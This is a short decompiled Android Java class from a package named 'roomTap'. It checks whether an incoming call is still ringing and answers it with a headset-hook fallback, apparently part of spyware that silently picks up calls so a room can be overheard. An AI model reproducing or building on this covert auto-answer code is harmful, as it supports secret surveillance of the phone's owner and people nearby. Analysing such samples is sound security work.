package com.network.android.roomTap;

import android.content.Context;
import android.telephony.TelephonyManager;
import com.network.android.c.a.a;

/* access modifiers changed from: package-private */
public final class d implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Context f117a;
    final /* synthetic */ AutoAnswerReceiver b;

    d(AutoAnswerReceiver autoAnswerReceiver, Context context) {
        this.b = autoAnswerReceiver;
        this.f117a = context;
    }

    public final void run() {
        boolean z = ((TelephonyManager) this.f117a.getSystemService("phone")).getCallState() == 1;
        a.a("answerCallITelephonyFirst - checking if phone still ringing: " + z);
        if (z) {
            a.a("answerCallITelephonyFirst failed. answering with headset hook");
            AutoAnswerReceiver autoAnswerReceiver = this.b;
            AutoAnswerReceiver.c(this.f117a);
        }
    }
}
